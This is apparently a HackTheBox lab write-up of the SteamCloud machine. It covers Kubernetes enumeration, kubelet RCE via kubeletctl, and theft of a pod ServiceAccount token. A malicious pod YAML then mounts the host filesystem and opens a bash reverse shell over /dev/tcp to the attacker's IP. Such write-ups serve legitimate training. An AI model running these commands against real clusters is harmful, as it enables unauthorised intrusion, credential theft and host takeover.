![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b8322962-e5d9-473d-a017-e1ff8f835145)

https://app.hackthebox.com/machines/SteamCloud

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began my enumeration with quick rustscan to check for the open ports & services. I observed multiple open ports from the scan.

```bash
sudo rustscan -a 10.10.11.133 -- -sC -sV -vv -oN steam_nmap
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/055b7985-10b0-43be-9f5e-f105a967cd7d)

```Rust
PORT      STATE SERVICE          REASON         VERSION
22/tcp    open  ssh              syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCu4TNCZjLe74tZ0HyspkMaghndsvuXkZJa4lJBt9arqgkm6u2HI/RRdwbjE14au2u/YF89y23Q55iOGraA+9JjpyTzDPo3kxE/RisYzJaUDmzza+hqEeyTxXkZby9+DAhKm5UXs7M2CMDr3cwOPPQ96u/zUX0gDG3CfYw4fAi2TDGa6jU5KmGzIQz6SQR3Bv6IYLDwzNJ0nHNZ3jxSbFS3SsmTwK749GJLrv62wAf4uUL/Ihynl8cCG5aor6T0Fk44v/9ndfujznBvWaMYVPpf9B49XlD7OhXB5pCK2nPZrdze+ch6yhAM/vYrYA4sNk3IuFG3OCrDkVeUJn5sJKx5
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHVj7iKnl8SWdGz6J4F3kvpZjM1Tim0iHlUnQByS8xJYnfwttLxVwGb+aaGbRhOJu4mq9y4crwFh50rC9mAEHWo=
|   256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXIZpU9XbtZ2zvx8rFEYTfGp+8JCJx5lSiRNEcqUFG8
80/tcp    open  http             syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
2379/tcp  open  ssl/etcd-client? syn-ack ttl 63
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-11T06:22:41
| Not valid after:  2024-08-10T06:22:41
| MD5:   a1d4 85a7 9d0f f668 2b53 6fd7 6f1c 34f2
| SHA-1: eb17 a123 768d d63d f114 ee9c 5f7b 3d7c 8864 8d7a
| -----BEGIN CERTIFICATE-----
| MIIDSzCCAjOgAwIBAgIIXeC07k5ZKnwwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UE
| AxMHZXRjZC1jYTAeFw0yMzA4MTEwNjIyNDFaFw0yNDA4MTAwNjIyNDFaMBUxEzAR
| BgNVBAMTCnN0ZWFtY2xvdWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQCZI5G97GsQCFSfLVEpeiiwZWVkbFgi+GDqPya1yrsg9mVh0IXoKjxQeU8T9Xpn
| nA+5BBVM988syreSHBoRsho7MluaHoMXnxQMDv8WSjCxf7iZU6jnvdrKtb1J24uM
| CT9xKpZ/rNiKQ/cln///6ybEu86UPpnTm5CxiHpVY1I4a843dL9/SZQpdjyKBonF
| xJf8MFnIDdmgg9XsgwC2ev9D4wZIeGwMLuW1jhr4hDATfRsvDkhIyIT6EdhDrHtP
| wb3jZOp/5lVAEpCmCB8askqoqT/Kb4qlaIsVkM8K0V7ThLheBtCNImeHfL7c+FDw
| NXsTqZKjTddzNfKq13PMRP5tAgMBAAGjgaEwgZ4wDgYDVR0PAQH/BAQDAgWgMB0G
| A1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB8GA1Ud
| IwQYMBaAFAMoLvz7iTOvz1rNvfhYdRXjZcn7MD4GA1UdEQQ3MDWCCWxvY2FsaG9z
| dIIKc3RlYW1jbG91ZIcECgoLhYcEfwAAAYcQAAAAAAAAAAAAAAAAAAAAATANBgkq
| hkiG9w0BAQsFAAOCAQEAj60qR9qTCthm5qWInyvXvXFjwDiVmsLyhmvWZ+bG9Ogv
| H0ueiHynBswE/QtStE1cu6x2lsn8SP4AEbETKxRSayQZLzev6NebKHBQqTpx3II5
| 3yNWNFPWayiBcWta/qD1Agm63fQFvHblBqnzsouNJslvbtcJtGS6rzhCGED++6Ut
| 3A8f4y0+Ky3cAcOhJVbBZMDOw/0MDBxOKEULwAkQDiuv5aK8549/irpQNrDhAOgW
| Z8uySZWR/+pH9c62q8MLz/aCkcku7ol44jrTmJkzknPM205AHmVp+GD/sMDqOPUR
| 4IE5mgB7+cUmJv4gTu/7uoEtpv4QR/oxcp1ydInzZg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server? syn-ack ttl 63
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-11T06:22:41
| Not valid after:  2024-08-10T06:22:41
| MD5:   849e d938 8193 25a0 98f9 dcc0 d8e4 7cd8
| SHA-1: 1a40 aeca 4afa c719 2ec9 f284 7d29 c845 3425 cde0
| -----BEGIN CERTIFICATE-----
| MIIDSzCCAjOgAwIBAgIIa6aOWeA33zcwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UE
| AxMHZXRjZC1jYTAeFw0yMzA4MTEwNjIyNDFaFw0yNDA4MTAwNjIyNDFaMBUxEzAR
| BgNVBAMTCnN0ZWFtY2xvdWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDDcpDk26X8rZf3A1LuoRtoLW/R3NoZyNKoMN0p0dcFksw1qSEGZiETgCaBZTDa
| d5Ifg6RZdszb16/LY+kkXlwn//wbnAdXOo3T1yUibIr8VHkR1aVmLh3nxidftiy+
| O63hrkhTKo7YnqxXo3+BP1aep/zR4yAptslx1Ti6M6vM3DbCAu67e/6VYO0ZmjUC
| KI9eokDWXTlIYjgNEBsk79QgZ5DkwsNveB1jGqnLh9inKQOCvNgNlo37GeFg9swD
| r7ctI0GM7VgshJkcIN5+roe24YImB9hMOdmtNCpeO7SPMzWS7oeOH9F7+uDSQCSH
| eInqVqInhcNQgt3SAf6v/YXnAgMBAAGjgaEwgZ4wDgYDVR0PAQH/BAQDAgWgMB0G
| A1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB8GA1Ud
| IwQYMBaAFAMoLvz7iTOvz1rNvfhYdRXjZcn7MD4GA1UdEQQ3MDWCCWxvY2FsaG9z
| dIIKc3RlYW1jbG91ZIcECgoLhYcEfwAAAYcQAAAAAAAAAAAAAAAAAAAAATANBgkq
| hkiG9w0BAQsFAAOCAQEAOPwY+MByp0Esq7jOYFaKM4y/sXrEfk/Fbrj2J5lIDP2E
| Fz14R4YgIJzb4Xsiid2cMKBjTwQAgsoR15C2apzXFloJfv7qgixUpRP7AgR+eBfU
| /vAqlXoGxRtB3DVkk+w1EDs/LlCtWh+jj+ndqdKnZTST9fVT4S4Y6mU3H9mNA4rY
| 6GzST4dtYKWwXu9ckcCPvdF0A0b+/78EaygMyHpcfvh39BTsOieQb07zT03VDmHi
| SvYZIO2V0MF+rBuZ65NvHQocpMMw0a2xiX0oCllJM+Obw5M7O1ikl1Nfql45D2A6
| gzMkKIof5tlX4XOtgIhQdOT0xkMDISayO5kXVvJQng==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
8443/tcp  open  ssl/https-alt    syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 9176c57a-73c0-4332-8316-ac5c6f3d7160
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: a1e382d9-cd8e-42dc-a193-d1f949496589
|     X-Kubernetes-Pf-Prioritylevel-Uid: 32560c2d-571b-4f54-ac21-d51a51b00c6b
|     Date: Sat, 12 Aug 2023 16:27:34 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 1342900d-0b99-44b5-9506-f5a00ad9bcb4
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: a1e382d9-cd8e-42dc-a193-d1f949496589
|     X-Kubernetes-Pf-Prioritylevel-Uid: 32560c2d-571b-4f54-ac21-d51a51b00c6b
|     Date: Sat, 12 Aug 2023 16:27:33 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 24a87ab8-c98a-4e81-9ce7-5a5c451bf6fb
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: a1e382d9-cd8e-42dc-a193-d1f949496589
|     X-Kubernetes-Pf-Prioritylevel-Uid: 32560c2d-571b-4f54-ac21-d51a51b00c6b
|     Date: Sat, 12 Aug 2023 16:27:34 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-10T06:22:38
| Not valid after:  2026-08-10T06:22:38
| MD5:   6734 e1a7 4ee9 633d 784c a613 8fc7 021a
| SHA-1: 880e 2f5f d0af 8b3d 5cf4 d012 190a 9834 be66 4f6f
| -----BEGIN CERTIFICATE-----
| MIID3DCCAsSgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
| a3ViZUNBMB4XDTIzMDgxMDA2MjIzOFoXDTI2MDgxMDA2MjIzOFowLDEXMBUGA1UE
| ChMOc3lzdGVtOm1hc3RlcnMxETAPBgNVBAMTCG1pbmlrdWJlMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsPY83/2BjmfGGFFoVo55sY8D5KP5VNaF1mhu
| GbhvwpNeXBB6t1gMI7o+Cd15tqp1YPC52u+tFZmLZ2LwgNPT4Yhn1MAHF9ZnDJoz
| nllEd30u1WGMhfVfeQA0xVHx/bCav8kTn9zQRP4fl/FLZV520caLnvTPBA2VcYlI
| 2v57jaSnSpamSmZwrqFtRDmQVuGjOcf7a/0nriadc4/xaP6+a4MQP+nNeRe63Uwy
| iwTD58BFMHsZW1TDIa14zgMGuoWnrfsA9h04HWhQTeyCetwTJdX9B1xtB0x1NJ/I
| KRzApbKal6UzHI0+jo8JTnTF+T5L/3QZony9o4+1zUnj2cr58QIDAQABo4IBHjCC
| ARowDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD
| AjAMBgNVHRMBAf8EAjAAMB8GA1UdIwQYMBaAFKlEoIQptW1GxgQZHDJpV6icF0wK
| MIG5BgNVHREEgbEwga6CCm1pbmlrdWJlQ0GCH2NvbnRyb2wtcGxhbmUubWluaWt1
| YmUuaW50ZXJuYWyCJGt1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2Nh
| bIIWa3ViZXJuZXRlcy5kZWZhdWx0LnN2Y4ISa3ViZXJuZXRlcy5kZWZhdWx0ggpr
| dWJlcm5ldGVzgglsb2NhbGhvc3SHBAoKC4WHBApgAAGHBH8AAAGHBAoAAAEwDQYJ
| KoZIhvcNAQELBQADggEBAGPFBr5Pdbe0B8VInhQIBSb3sH0UmTJb1Fl8GeWECPzx
| W1bXNZGmNeTQ1eP6QBlvl0mWKwmGoDDd7+AUwrryfElByF6oIGfNya13ENCMECm/
| EhSaHbA+dvCoci0Sh02xKbs0iFwUquf8acytQWQGcEFH8gFZ2iXlf6E3viwnvIZH
| 0TvfCQ6PbKafKEBdgZiNyrmJeWTKPJXo7aYMLpa+rj/eTjluzKIR5ePxD3Blx4le
| 5ogb56M0jPW4U1/8nxW8o4Y4p6WnRvaAtCSov3tJItQXPaPtEfoYpKqnzbnwVsXK
| whK7eF0uDiUy2UW37frntFLJbJjZ2jqvy9Ne3WX+Egg=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10249/tcp open  http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1691734963
| Subject Alternative Name: DNS:steamcloud
| Issuer: commonName=steamcloud-ca@1691734962
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-11T05:22:42
| Not valid after:  2024-08-10T05:22:42
| MD5:   72fb 69b7 e3ce 0682 a8d9 2e71 19a1 4d79
| SHA-1: b5f9 f6df ca18 5b1c 0972 2fb5 e38f d480 fd8a 02ef
| -----BEGIN CERTIFICATE-----
| MIIDKzCCAhOgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAjMSEwHwYDVQQDDBhzdGVh
| bWNsb3VkLWNhQDE2OTE3MzQ5NjIwHhcNMjMwODExMDUyMjQyWhcNMjQwODEwMDUy
| MjQyWjAgMR4wHAYDVQQDDBVzdGVhbWNsb3VkQDE2OTE3MzQ5NjMwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDIAWLEf6lFxWgLsn61vvlfx6LbI0BYy3p9
| 4KZcwjUoSndBzB9EYBtbyj0ANOrs2LgPo02Ht0699jrOzzQoqXJ9lA1z09Tah4Lo
| zlaPKf7FfjQo7uYrJc/0g7Ddn++3h3XQ5+8Bmg24x9gEikghrEiVQZfw1Ja0d0F8
| Zzw6JLKEOh8XPhgeMzq+g4HxMUpvnoHA4J7D1zBmOraOevmzwBsdl+sj2cBneu4N
| egkbCR/p71itbClDkAhpHrGQscMksHAvcpONcrEYSQd6tVkEJVXmKPOlfR6XIC1m
| dMLHcwEdjczj4TjC9/wQ5/+37b3L7Hujy6jD0xT3a/gBGBUmOuHNAgMBAAGjbTBr
| MA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8E
| AjAAMB8GA1UdIwQYMBaAFMK+NhmEGJ2IHxJi9jynq4RSjezsMBUGA1UdEQQOMAyC
| CnN0ZWFtY2xvdWQwDQYJKoZIhvcNAQELBQADggEBAEanFDvVqGYehJ2eQPqAQjWW
| fgwa0lG1XgKKLlfErxr0k2av2HQb3iXtB5GR72HTUXmFHrUuSVwprU7yMojwbg23
| ObtnJ4PAvDdo4osqSdRw+vHyk1oVV28pcvNVIdmklQT4hRbEyTzCnFR2O3Uy/AHL
| 9E0AQuA3cXzJ3AIpJ19ccTgDWVs9oBEA/shXXk37KgmuLN8usb+XMJrxNZaN5hgK
| 3lhXzF9N8z+5tMyis2W4fwFVKk0TTKh8P5nzhoBoB3LjjMCDB1I3mpefdTfVydGa
| x8LceVV7id7whlKxVLZZ8UcXb7Ik+IleLyITa/bzFDaJy/5EUUgLNB8Y1xQ3DWw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```

From the port scan results I obseerved that the target host has running Kubernetes cluster in it:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e05b50a5-2257-4bce-a5bf-eb79374f98b6)

Further I checked for the http services running on port 80, but I didn't found anything on it.
While checking the port 8443 on https, I observed this page:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/90c4783a-05c2-45e6-94f2-97e90cb8eb1d)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Kubernetes enumeration:

Once confirming that there is a kubernetes cluster is running, I have to perform enumeration related to Kubernetes & for any kind of enumeration & exploitation "[Hacktrickz](https://book.hacktricks.xyz)" is always my first choice.

While searching for the kubernetes on the website, I didn't found any specific topic related to it but when I checked the write-ups of this box I observed that there was a section of cloud-security which was having the seperate section of "Pentesting Kubernetes" but right now it's not available. So, I used web-archive to browse the older version of Hacktrickz & found the section of [Pentesting kubernets](https://web.archive.org/web/20220928002056/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/) finally.

I followed some steps & suggested comands in the section of [Pentesting from outside](https://web.archive.org/web/20220927144232/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside)

Started with port 8443 but didn't received any different response in comparison of what I already observed earlier.
Next, I checked for port 10250 & checked for metrics, pods & runningpods for which I got clear response:

```bash
curl -k https://steamcloud.htb:10250/metrics #to check for the metrics
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b46434b3-e4a5-403d-925e-3e2b1b8c5272)

```bash
curl -k https://steamcloud.htb:10250/pods 

or

curl -k https://steamcloud.htb:10250/pods | jq | head #jq = json query
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a48ec042-cca7-4d6c-a73c-60a45d74e640)

```bash
curl -k https://steamcloud.htb:10250/pods | jq '.items[].metadata.name' #to check for all the active pods
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cc080576-5319-47d1-a972-52e738967bc2)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### RCE using 'kubeletctl':

For further enumeration, I used a tool called "**kubeletctl**" created by [CyberArk](https://github.com/cyberark/kubeletctl).

I started with checking the pods again:

```bash
kubeletctl pods -s 10.10.11.133 #-s=server
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/32c4e99a-6817-4705-b85f-d3834365bd20)

Then checked for the running pods, which gave me result in JSON query:

```bash
kubeletctl runningpods -s 10.10.11.133
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/32a74fd6-02f5-4437-bf53-3d57156f09f9)

To filter the results, I used below query:

```bash
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/385310aa-d601-4a2d-99b7-252a596ffc94)

Next, using kubeletctl I scan the pods to check if they are vulnerable for RCE or not:

```bash
kubeletctl scan rce --server 10.10.11.133
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ea7e462c-c5bc-4637-9f86-370c5c9e34ff)

From the results I observed that "nginx" & "kube-proxy-6vj5n" is vulnerable.

Now, with the reference from Hacktrickz I used the gathered information & kubeletctl I got an RCE as root user:

```bash
kubeletctl exec /bin/bash -p nginx -c nginx -s 10.10.11.133 #used the vulnerable pod & container as "nginx"
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ec91dcff-ba59-46cb-bcfe-e2d276676e5a)

After getting the connection as root, I fetched the user flag as well. (pwn3d! 🙂)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Docker Escape:

After fetching the user flag & getting the shell as root. I performed some manual enumeration & observed that I am in a docker environment.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f86b90e8-925d-4012-8330-24957f0e8791)

From the [HackTrickz](https://web.archive.org/web/20220705044322/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration) I got to know about the ServiceAccount tokens:

```
ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.
Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.
```

Using the reference of the Hactrickz I got 3 location where these ServiceAccount secrets are stored:

```
- /run/secrets/kubernetes.io/serviceaccount
- /var/run/secrets/kubernetes.io/serviceaccount
- /secrets/kubernetes.io/serviceaccount
```
I found 3 files inside this directory: "/run/secrets/kubernetes.io/serviceaccount"

```
- ca.crt: It's the ca certificate to check kubernetes communications
- namespace: It indicates the current namespace
- token: It contains the service token of the current pod.
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cd323320-ebdc-4e95-8bd3-d9b20e74540d)

Now, with the ca.crt and the token, I can authenticate to the cluster which is running on 8443 on which I wasn't able to authenticate earlier.

For the authenticate I extracted ca.crt & token into my local kali host.

```bash
kubeletctl exec 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx -s 10.10.11.133 > ca.crt
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/63858c4d-01a4-4725-ab83-11676b7e31e6)

```bash
export token=$(kubeletctl exec 'cat /run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx -s 10.10.11.133) #saved this in an environment variable to reduce copy paste efforts.
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1414ae6d-18ea-4ee1-8eee-1d6af6270d5d)

After having all the necessary file saved into my attacker host, I downloaded another tool to authenticate to API called "kubectl"

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" #to download kubectl
```

Using the kubectl, certtificates & token, I was finally able to authnticate to Kube-API on port 8443.

```bash
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod #listed the pods
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/30a8345e-a6d1-451c-9b58-41dfe07b0354)

When tried to get the information about the namespaces I observed that still I can't run much commands as privilege is limited:

```bash
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7e936ef6-b6a7-41c1-a093-a5a576a07e2f)

I used "auth can-i" command in kubectl to see if a given account can take some action. With the -list flag, it will show all permissions:

```bash
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2178c6c7-a557-4e76-aafe-58b35c1a4c54)

In the list on the 3rd line I observed that I can create pods inside the container.

Once I confirmed that I can create pods inside the container I extraced further information about the nginx pod:

```bash
kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
```
From the results we can see that namespace is "default" & "image= nginx:1.14.2".

Using this info & taking refrence from [0xdf writeup](https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html#shell-as-root), I created a yaml file which will give me reverse shell.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kill3r
  namespace: default
spec:
  containers:
  - name: kill3r
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/<my-ip>/8443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

After the creation of this yaml file I used this to create the pod. This Pod will mount / from the host machine into /mnt inside the container (we could have chosen another directory).

```bash
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f kill3r.yaml
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/26bbe09c-4862-4389-9f66-850402ccacc1)

After the pod is created I quickly received the shell:
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8d571b99-59ee-406a-bbf9-d3067193e924)

As the volume is mounted in "/mnt" folder I moved into the directory, escaped the container & grabbed the root flag finally. (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82b6685c-814b-40e3-ae40-1e6bd0aef1d4)
